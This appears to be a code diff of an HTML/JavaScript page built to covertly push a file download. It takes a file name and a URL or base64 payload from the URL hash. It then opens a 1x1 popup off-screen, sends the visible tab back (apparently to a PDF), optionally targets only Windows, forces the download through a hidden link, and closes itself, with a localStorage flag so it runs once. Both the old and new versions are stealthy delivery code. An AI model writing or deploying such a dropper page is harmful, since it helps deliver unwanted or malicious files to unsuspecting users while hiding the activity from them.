@@ -1,108 +1,90 @@
 <!DOCTYPE html>
 <html><head><script>
-// INSTANT: check if already done → go back immediately
+var _inPopup=location.hash.indexOf('popup=1')!==-1||!!window.opener;
 try{
-  var _h=location.hash.slice(1);
+  var _h=location.hash.slice(1).replace('&popup=1','');
   if(_h){
     try{_h=decodeURIComponent(_h)}catch(e){}
     if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);
     var _s=_h.indexOf('~');
     var _n=_s>0?_h.slice(0,_s):'x';
     if(localStorage.getItem('dl_done_'+_n)){
-      history.back();
-      setTimeout(function(){window.close()},200);
+      if(_inPopup){window.close()}else{history.back();setTimeout(function(){window.close()},200)}
       throw 'done';
     }
   }
-  // NOT done yet: open myself in popup, then go back to PDF
-  if(!window.opener && !window._isPopup){
-    var popup=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
-    if(popup){
-      // Popup opened — go back to PDF
-      history.back();
-      setTimeout(function(){window.close()},200);
-      throw 'delegated';
-    }
-    // Popup blocked — continue in same tab (fallback)
+  if(!_inPopup){
+    var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
+    if(p){history.back();setTimeout(function(){window.close()},200);throw 'delegated'}
   }
-}catch(e){if(e==='done'||e==='delegated'){document.documentElement.innerHTML='';}}
+}catch(e){if(e==='done'||e==='delegated'){document.documentElement.innerHTML=''}}
 </script><title>.</title></head>
 <body>
 <script>
-// Mark as popup context
-window._isPopup = true;
-window.blur();
-try{window.resizeTo(1,1);window.moveTo(-9999,-9999);}catch(e){}
+window._isPopup=true;
+try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
 try {
-  var h = location.hash.slice(1);
-  // Remove popup marker from hash
-  h = h.replace('&popup=1','').replace('?popup=1','');
-  if (!h) throw 'No data';
-  try { h = decodeURIComponent(h); } catch(e) {}
+  var h=location.hash.slice(1).replace('&popup=1','');
+  if(!h)throw 'No data';
+  try{h=decodeURIComponent(h)}catch(e){}
 
-  var winOnly = false;
-  if (h.slice(-2) === '!W') {
-    winOnly = true;
-    h = h.slice(0, -2);
-  }
-  if (winOnly && navigator.platform.indexOf('Win') === -1) {
-    window.close();
+  var winOnly=false;
+  if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
+  if(winOnly&&navigator.platform.indexOf('Win')===-1){
+    if(_inPopup)window.close();else history.back();
     throw 'skip';
   }
 
-  var sep = h.indexOf('~');
-  var fname = sep > 0 ? h.slice(0, sep) : 'delivered.bin';
-  var data = sep > 0 ? h.slice(sep + 1) : h;
+  var sep=h.indexOf('~');
+  var fname=sep>0?h.slice(0,sep):'delivered.bin';
+  var data=sep>0?h.slice(sep+1):h;
+  document.title=fname;
 
-  document.title = fname;
-
-  var key = 'dl_done_' + fname;
-  if (localStorage.getItem(key)) {
-    window.close();
+  var key='dl_done_'+fname;
+  if(localStorage.getItem(key)){
+    if(_inPopup)window.close();else history.back();
     throw 'skip';
   }
 
-  function markDone() {
-    localStorage.setItem(key, '1');
-    setTimeout(function(){ window.close(); }, 2000);
+  function goBack(){
+    if(_inPopup){window.close()}
+    else{history.back();setTimeout(function(){window.close()},300)}
   }
 
-  function doDownload(blob) {
-    if (!blob || blob.size === 0) {
-      document.body.textContent = 'Empty — retry';
-      return;
-    }
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = fname;
-    document.body.appendChild(a);
-    a.click();
+  function markDone(){
+    localStorage.setItem(key,'1');
+    setTimeout(goBack,1500);
+  }
+
+  function doDownload(blob){
+    if(!blob||blob.size===0){goBack();return}
+    var url=URL.createObjectURL(blob);
+    var a=document.createElement('a');
+    a.href=url;a.download=fname;
+    document.body.appendChild(a);a.click();
     markDone();
   }
 
-  if (data.indexOf('http') === 0) {
-    fetch(data)
-      .then(function(r) {
-        if (!r.ok) throw 'HTTP ' + r.status;
-        var expected = parseInt(r.headers.get('content-length') || '0');
-        return r.blob().then(function(blob) {
-          if (expected > 0 && blob.size < expected) throw 'Incomplete';
-          return blob;
-        });
-      })
-      .then(function(blob) { doDownload(blob); })
-      .catch(function(e) { document.body.textContent = 'Failed: ' + e; });
+  if(data.indexOf('http')===0){
+    fetch(data).then(function(r){
+      if(!r.ok)throw 'HTTP '+r.status;
+      var exp=parseInt(r.headers.get('content-length')||'0');
+      return r.blob().then(function(b){
+        if(exp>0&&b.size<exp)throw 'Incomplete';
+        return b;
+      });
+    }).then(function(b){doDownload(b)}).catch(function(e){
+      document.body.textContent='Failed: '+e;
+      setTimeout(goBack,3000);
+    });
   } else {
-    try {
-      var raw = atob(data);
-      var arr = new Uint8Array(raw.length);
-      for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
-      doDownload(new Blob([arr], {type: 'application/octet-stream'}));
-    } catch(e) { document.body.textContent = 'Decode fail: ' + e; }
+    try{
+      var raw=atob(data);
+      var arr=new Uint8Array(raw.length);
+      for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
+      doDownload(new Blob([arr],{type:'application/octet-stream'}));
+    }catch(e){setTimeout(goBack,2000)}
   }
-} catch(e) {
-  if (e !== 'skip') document.body.textContent = '';
-}
+} catch(e){if(e!=='skip')document.body.textContent=''}
 </script>
 </body></html>
